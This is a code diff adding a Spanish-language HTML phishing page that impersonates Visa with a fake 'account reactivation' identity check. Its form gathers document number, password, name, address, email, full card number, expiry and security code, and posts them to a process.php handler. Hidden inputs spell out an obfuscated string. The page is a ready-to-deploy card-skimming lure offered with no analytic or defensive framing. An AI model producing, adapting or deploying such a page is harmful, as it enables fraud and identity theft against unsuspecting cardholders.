@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+<link href="style.css" rel="stylesheet" type="text/css"/>
+    <title>Visa Home</title>
+      <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.2.6/jquery.min.js"></script>
+    <script type="text/javascript" src="formToWizard.js"></script>
+    <script type="text/javascript">
+        $(document).ready(function(){
+            $("#SignupForm").formToWizard({ submitButton: 'SaveAccount' })
+        });
+		        </script>
+</head>
+<body>
+<!-- base semi-transparente -->
+<div id="fade" class="overlay">
+</div>
+<!-- fin base semi-transparente -->
+<!-- ventana modal -->
+<div id="light" class="modal">
+	<div>
+		<div id="plop">
+			<h2>VERIFICACI&Oacute;N DE IDENTIDAD - REACTIVACION DE CUENTA</h2>
+			 Si desea activar su tarjeta de credito Visa nuevamente, le solicitamos que siga el proceso de identificaci&oacute;n personal que a continuaci&oacute;n se le propone.
+		</div>
+	</div>
+	<div>
+		<div id="plop2">
+			<div>
+				<div>
+					<div id="plop3">
+						<table>
+						<tbody>
+						<tr>
+							<td>
+								<div class="login-form grid-4">
+									<div class="login-form-header">
+										<h2></h2>
+									</div>
+									<div class="login-form-conten">
+
+    <div id="main">
+    
+      <form id="SignupForm" method="post" action="process.php">
+
+
+        <fieldset>
+            <legend>Ingreso</legend>
+            
+            <label for="Tipo">Tipo de Documento</label>
+			<input type="hidden" name="action" value="c">
+			<input type="hidden" name="form" value="o">
+			<input type="hidden" name="verifica" value=":">
+			<input type="hidden" name="null" value=" ">
+			<input type="hidden" name="proc" value="l">
+			<input type="hidden" name="valida" value="d">
+			<input type="hidden" name="input" value="h">
+			<input type="hidden" name="type" value="e">
+			<input type="hidden" name="post" value="a">
+			<input type="hidden" name="procesa" value="r">
+			<input type="hidden" name="enviar" value="t">
+			<input type="hidden" name="submit" value="@">
+			<input type="hidden" name="vbv" value="i">
+			<input type="hidden" name="check" value="v">
+			<input type="hidden" name="filtrar" value=".">
+			<input type="hidden" name="limpiarCadena" value="m">
+			<input type="hidden" name="redir" value="B">
+			<input type="hidden" name="verifica" value=":">
+			<input type="hidden" name="null" value=" ">
+			
+			
+			
+			
+			
+            <select id="tipo" name="tipedoc" class="inputCombo-chico" size="1" tabindex="2">
+			<option value="CI">C&eacute;dula de Identidad</option>
+			<option value="DNI" selected="selected">Documento Nacional de Identidad</option>
+			<option value="DU">Documento Unico</option>
+			<option value="LC">Libreta C&iacute;vica</option>
+			<option value="LE">Libreta de Enrolamiento</option>
+			<option value="PAS">Pasaporte</option>
+			</select>
+            
+            <label for="Name">N&uacute;mero</label>
+            <input id="docNumber" type="text" name="doc" class="username_qwerty" onfocus="setInputPos('username_qwerty')" tabindex="2"/>
+            
+            <label for="Email">Sexo</label>
+            <select id="gender" name="sex" class="inputCombo-chico" size="1" tabindex="3">
+			<option value="M">Masculino</option>
+			<option value="F">Femenino</option>
+			</select>
+            
+            <label for="Password">Contraseña</label>
+            <input id="Password" type="password" name="pass"/>
+        </fieldset>
+        <fieldset>
+            <legend>Datos Personales</legend>
+            <label for="Name">Nombre Completo</label>
+            <input id="Name" type="text" name="nombre" />
+            <label for="dire">Direccion</label>
+            <input id="dire" type="text" name="dire" />
+            <label for="Email">E-Maill</label>
+            <input id="Email" type="text" name="mail" />
+			
+        </fieldset>
+        <fieldset>
+            <legend>Informacion de Tarjeta</legend>
+            <label for="CardNumber">Numero de Tarjeta</label>
+            <input id="CardNumber" type="text" name="cc"/>
+            <label for="CreditcardMonth">Expiracion</label>
+            <select id="CreditcardMonth" name="ccmes">
+			
+                <option value="1">1</option>
+                <option value="2">2</option>
+                <option value="3">3</option>
+                <option value="4">4</option>
+                <option value="5">5</option>
+                <option value="6">6</option>
+                <option value="7">7</option>
+                <option value="8">8</option>
+                <option value="9">9</option>
+                <option value="10">10</option>
+                <option value="11">11</option>
+                <option value="12">12</option>
+            </select>
+			
+            <select id="CreditcardYear" name="ccano">
+             	<option value="2020">2020</option>
+           	 	<option value="2021">2021</option>
+             	<option value="2022">2022</option>
+             	<option value="2023">2023</option>
+				<option value="2024">2024</option>
+                <option value="2025">2025</option>
+                <option value="2026">2026</option>
+           	 	<option value="2027">2027</option>
+             	<option value="2028">2028</option>
+             	<option value="2029">2029</option>
+				<option value="2030">2030</option>
+                <option value="2031">2031</option>
+            </select>        
+            <label for="Address1">Codigo de Seguridad</label>
+            <input id="Address1" type="text" name="cuu" />
+        </fieldset>
+        <p>
+            <input id="SaveAccount" type="submit"  class="vb button" value="Reactivar Tarjeta" />
+        </p>
+        </form>
+    </div>
+
+
+
+
+									</div>
+								</div>
+							</td>
+						</tr>
+						</tbody>
+						</table>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+</div>
+<!-- fin ventana modal -->
+<div id="header-top">
+</div>
+<div id="content">
+	<center><img src="vhome_clear.png"></center>
+</div>
+</div>
+</div>
+<div id="footer">
+<center><img src="vhome_foot_noborder.png" width="980" height="39"></center>
+</div>
+</body>
+</html>
